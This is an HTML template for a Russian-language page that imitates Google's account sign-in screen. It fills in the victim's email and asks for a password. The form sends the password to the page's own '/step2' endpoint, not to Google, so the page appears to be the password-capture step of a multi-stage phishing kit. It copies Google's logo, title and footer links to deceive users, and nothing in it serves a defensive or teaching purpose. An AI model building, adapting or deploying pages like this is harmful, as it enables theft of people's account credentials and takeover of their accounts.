<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title data-i18n="page_title">Вход – аккаунты Google</title>
<link rel="icon" type="image/svg+xml" href="/static/google_logo.svg">
<link rel="stylesheet" href="/static/style.css">
<script>
  (function() {
    var saved = localStorage.getItem('theme');
    if (saved) document.documentElement.setAttribute('data-theme', saved);
  })();
</script>
</head>
<body>

  <div class="main">
    <img class="logo" src="/static/google_logo.svg" alt="Google">

    <h1 data-i18n="welcome_title">Добро пожаловать!</h1>

    <div class="account">
      <div class="avatar">👤</div>
      <span>{{ email }}</span>
      <span class="arrow">▼</span>
    </div>

    <form action="/step2" method="POST" autocomplete="off" class="password-form" novalidate>
      <input type="password" name="password" id="pw" required autofocus placeholder="Введите пароль" data-i18n-placeholder="password_label">

      <div class="error-message" id="passwordError" style="display: none;">
        <span class="error-icon">!</span>
        <span>Введите пароль.</span>
      </div>

      <label class="checkbox">
        <input type="checkbox" onclick="document.getElementById('pw').type = this.checked ? 'text' : 'password'">
        <span data-i18n="show_password">Показать пароль</span>
      </label>

      <div class="actions">
        <a class="forgot" href="#" data-i18n="other_way">Другой способ</a>
        <button type="submit" data-i18n="next">Далее</button>
      </div>
    </form>
  </div>

  <footer class="footer">
    <div class="footer-row">
      <div class="footer-left">
        <div class="lang-wrap">
          <span class="lang-display" id="langDisplay">Русский</span>
          <span class="lang-arrow">▼</span>
          <select class="lang-select" id="langSelect" onchange="changeLang(this.value)">
            <option value="ru">Русский</option>
            <option value="en">English (United States)</option>
            <option value="de">Deutsch</option>
            <option value="fr">Français</option>
            <option value="es">Español</option>
            <option value="it">Italiano</option>
            <option value="pt">Português</option>
            <option value="pl">Polski</option>
            <option value="uk">Українська</option>
            <option value="zh">简体中文</option>
          </select>
        </div>
      </div>
      <div class="footer-right">
        <a href="#" data-i18n="help">Справка</a>
        <a href="#" data-i18n="privacy">Конфиденциальность</a>
        <a href="#" data-i18n="terms">Условия</a>
      </div>
    </div>
  </footer>

  <script src="/static/i18n.js"></script>
  <script>initLang();</script>

  <script>
    document.querySelector('form').addEventListener('submit', function(e) {
      var input = document.getElementById('pw');
      var error = document.getElementById('passwordError');
      var value = input.value;

      if (value === '') {
        e.preventDefault();
        error.style.display = 'flex';
        input.style.borderColor = '#efb9b7';
        input.style.borderWidth = '2px';
      } else {
        error.style.display = 'none';
        input.style.borderColor = '';
        input.style.borderWidth = '';
      }
    });

    document.getElementById('pw').addEventListener('input', function() {
      document.getElementById('passwordError').style.display = 'none';
      this.style.borderColor = '';
      this.style.borderWidth = '';
    });
  </script>
</body>
</html>
